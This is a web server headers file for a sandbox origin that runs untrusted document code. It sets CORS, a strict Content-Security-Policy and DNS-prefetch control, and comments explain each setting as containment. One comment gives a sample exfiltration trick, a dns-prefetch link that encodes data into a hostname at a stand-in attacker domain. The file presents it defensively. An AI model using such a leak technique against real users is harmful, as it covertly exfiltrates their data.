# Response headers for the sandbox origin, served by the Cloudflare assets
# runtime in production (copied into ./dist by the build). Three concerns live
# here:
#
#   1. CORS + resource policy — the opaque `allow-scripts` iframe fetches the
#      Pyodide wasm/wheels cross-origin, so they must be CORS-readable. `.wasm`
#      is served as `application/wasm` by the assets runtime natively. This
#      origin serves no credentials and reads no cookies, so `*` is safe.
#
#   2. Content-Security-Policy — the network posture below IS the containment
#      model for untrusted document code:
#        - default-src 'none' is the floor: anything not explicitly enumerated
#          below is denied, so a fetch directive left unset blocks rather than
#          inheriting a permissive fallback.
#        - connect-src allows ONLY 'self' plus the two PyPI wheel hosts micropip
#          needs (pypi.org for the JSON index, files.pythonhosted.org for the
#          wheels). No other fetch/XHR/WebSocket destination is reachable, so
#          document code cannot exfiltrate or call out to arbitrary hosts. The
#          module CDN (esm.sh) is deliberately NOT here — it is a script-src
#          source, not a fetch target, so imports work but fetch() to it does
#          not.
#        - frame-src/child-src/worker-src/object-src 'none': untrusted code
#          cannot spawn a child frame, worker, or object. Beyond blocking those
#          as egress/compute, this denies a fresh realm — the only way to recover
#          the WebRTC constructors the bootstrap deletes from this frame.
#        - webrtc 'block': connect-src does NOT govern WebRTC. This directive is a
#          draft Chromium does not enforce, so the real block is the bootstrap
#          deleting the RTCPeerConnection constructors before document code runs;
#          the directive is kept for engines that may honor it later.
#        - script-src allows 'self', the module CDN for ES-module imports,
#          `blob:` for the in-browser-transpiled module the renderer imports,
#          'wasm-unsafe-eval' for the Pyodide WebAssembly runtime, and
#          'unsafe-inline' because the sandbox exists to run the document's OWN
#          scripts — an html document IS inline <script>, classic or module, and
#          a static file cannot nonce arbitrary user code.
#          Inline execution grants no new capability: containment is the opaque
#          origin plus the network lockdown above, not script-src. Built-in
#          Pyodide packages are self-hosted ('self'); nothing loads from a
#          third-party package CDN.
#        - frame-ancestors limits embedders to the web app origin plus the
#          mobile app-shell origins: capacitor://localhost is the iOS WebView
#          shell, http://localhost:* the Android/dev shell (androidScheme is
#          `http`, so the Android WebView origin is http://localhost on an
#          arbitrary port — the portless form matched only port 80 and blocked
#          the ported dev origin). No wildcard — arbitrary sites cannot frame
#          this origin.
#
#   3. X-DNS-Prefetch-Control: off — CSP cannot cover DNS prefetch, so without
#      this a document could leak data by encoding it into a hostname and
#      triggering a lookup via `<link rel="dns-prefetch" href="//data.evil.com">`.
/*
  Access-Control-Allow-Origin: *
  Cross-Origin-Resource-Policy: cross-origin
  X-DNS-Prefetch-Control: off
  Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' blob: https://esm.sh; worker-src 'none'; connect-src 'self' https://pypi.org https://files.pythonhosted.org; frame-src 'none'; child-src 'none'; object-src 'none'; webrtc 'block'; img-src 'self' blob: data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; frame-ancestors https://hushbox.ai capacitor://localhost http://localhost:*; base-uri 'self'; form-action 'self'
